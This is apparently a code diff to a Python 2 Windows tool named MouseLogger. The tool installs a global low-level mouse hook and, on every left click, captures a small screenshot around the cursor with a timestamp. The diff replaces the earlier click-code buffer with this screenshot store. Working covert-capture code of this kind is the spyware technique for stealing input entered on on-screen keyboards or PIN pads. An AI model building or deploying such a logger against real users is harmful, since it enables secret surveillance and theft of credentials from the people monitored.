@@ -6,6 +6,7 @@ from ctypes.wintypes import MSG
 from ctypes.wintypes import DWORD
 import threading
 import time
+import datetime
 
 from ctypes import (
 	byref, memset, pointer, sizeof, windll,
@@ -59,23 +60,6 @@ kernel32 = windll.kernel32
 WH_MOUSE_LL=14
 WM_MOUSEFIRST=0x0200
 
-keyCodes={
-	0x200 : "", #"[MOUSEMOVE]", ## commented bcuz it spams the living crap out of the output.
-	0x201 : "", #"[LBUTTONDOWN]",
-	0x202 : "", #"[LBUTTONUP]",
-	0x203 : "", #"[LBUTTONDBLCLK]",
-	0x204 : "", #"[RBUTTONDOWN]",
-	0x205 : "", #"[RBUTTONUP]",
-	0x206 : "", #"[RBUTTONDBLCLK]",
-	0x207 : "", #"[MBUTTONDOWN]",
-	0x208 : "", #"[MBUTTONUP]",
-	0x209 : "", #"[MBUTTONDBLCLK]",
-	0x20A : "", #"[MOUSEWHEEL]",
-	0x20B : "", #"[XBUTTONDOWN]",
-	0x20C : "", #"[XBUTTONUP]",
-	0x20D : "", #"[XBUTTONDBLCLK]",
-	0x20E : "", #"[MOUSEHWHEEL]"
-}
 
 # Initilisations
 SM_XVIRTUALSCREEN = 76
@@ -125,10 +109,10 @@ class MouseLogger(threading.Thread):
 		threading.Thread.__init__(self, *args, **kwargs)
 		self.hooked  = None
 		self.daemon=True
-		self.keys_buffer=""
 		self.lUser32=user32
 		self.pointer=None
 		self.stopped=False
+		self.screenshots=[]
 
 	def run(self):
 		if self.install_hook():
@@ -138,59 +122,56 @@ class MouseLogger(threading.Thread):
 		msg = MSG()
 		user32.GetMessageA(byref(msg),0,0,0)
 		while not self.stopped:
-			time.sleep(.2)
+			time.sleep(1)
 		self.uninstall_hook()
 			
 	def stop(self):
 		self.stopped=True
 
-	def dump(self):
-		res=self.keys_buffer
-		self.keys_buffer=""
-		return res
+	def retrieve_screenshots(self):
+		screenshot_list=self.screenshots
+		self.screenshots=[]
+		return screenshot_list
 
-	def convert_key_code(self, code):
-		##http://www.pinvoke.net/default.aspx/Constants.WM
-		if code in keyCodes:
-			if code == 0x201:
-				pos = queryMousePosition()
+	def get_screenshot(self):
+		pos = queryMousePosition()
 
-				limit_width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
-				limit_height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
-				limit_left = GetSystemMetrics(SM_XVIRTUALSCREEN)
-				limit_top = GetSystemMetrics(SM_YVIRTUALSCREEN)
+		limit_width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
+		limit_height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
+		limit_left = GetSystemMetrics(SM_XVIRTUALSCREEN)
+		limit_top = GetSystemMetrics(SM_YVIRTUALSCREEN)
 
-				height = min(100,limit_height)
-				width = min(200,limit_width)
-				left = max(pos['x']-100,limit_left)
-				top = max(pos['y']-50,limit_top)
+		height = min(100,limit_height)
+		width = min(200,limit_width)
+		left = max(pos['x']-100,limit_left)
+		top = max(pos['y']-50,limit_top)
 
-				srcdc = GetWindowDC(0)
-				memdc = CreateCompatibleDC(srcdc)
-				bmp = CreateCompatibleBitmap(srcdc, width, height)
-				try:
-					SelectObject(memdc, bmp)
-					BitBlt(memdc, 0, 0, width, height, srcdc, left, top, SRCCOPY)
-					bmi = BITMAPINFO()
-					bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
-					bmi.bmiHeader.biWidth = width
-					bmi.bmiHeader.biHeight = height
-					bmi.bmiHeader.biBitCount = 24
-					bmi.bmiHeader.biPlanes = 1
-					buffer_len = height * ((width * 3 + 3) & -4)
-					pixels = create_string_buffer(buffer_len)
-					bits = GetDIBits(memdc, bmp, 0, height, byref(pixels),
-						pointer(bmi), DIB_RGB_COLORS)
-				finally:
-					DeleteObject(srcdc)
-					DeleteObject(memdc)
-					DeleteObject(bmp)
+		srcdc = GetWindowDC(0)
+		memdc = CreateCompatibleDC(srcdc)
+		bmp = CreateCompatibleBitmap(srcdc, width, height)
+		try:
+			SelectObject(memdc, bmp)
+			BitBlt(memdc, 0, 0, width, height, srcdc, left, top, SRCCOPY)
+			bmi = BITMAPINFO()
+			bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
+			bmi.bmiHeader.biWidth = width
+			bmi.bmiHeader.biHeight = height
+			bmi.bmiHeader.biBitCount = 24
+			bmi.bmiHeader.biPlanes = 1
+			buffer_len = height * ((width * 3 + 3) & -4)
+			pixels = create_string_buffer(buffer_len)
+			bits = GetDIBits(memdc, bmp, 0, height, byref(pixels),
+				pointer(bmi), DIB_RGB_COLORS)
+		finally:
+			DeleteObject(srcdc)
+			DeleteObject(memdc)
+			DeleteObject(bmp)
 
-				if bits != height or len(pixels.raw) != buffer_len:
-					raise ValueError('MSSWindows: GetDIBits() failed.')
+		if bits != height or len(pixels.raw) != buffer_len:
+			raise ValueError('MSSWindows: GetDIBits() failed.')
 
-				return pixels.raw
-			return keyCodes[code]
+		return pixels.raw, height, width
+
 
 	def install_hook(self):
 		CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
@@ -207,13 +188,16 @@ class MouseLogger(threading.Thread):
 		self.hooked = None
 
 	def hook_proc(self, nCode, wParam, lParam):
-		hooked_key = self.convert_key_code(wParam)
-		self.keys_buffer+=str(hooked_key)
+		##http://www.pinvoke.net/default.aspx/Constants.WM
+		if wParam == 0x201:
+			buf, height, width = self.get_screenshot()
+			self.screenshots.append((datetime.datetime.now(), height, width, buf))
 		return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
 
 if __name__=="__main__":
-	MouseLogger = MouseLogger()
-	MouseLogger.start()
+	ml = MouseLogger()
+	ml.start()
 	while True:
 		time.sleep(5)
-		print MouseLogger.dump()
+		for d, height, width, buf in ml.retrieve_screenshots():
+			print "screenshot of %s/%s taken at %s (%s bytes)"%(height, width, d, len(buf))
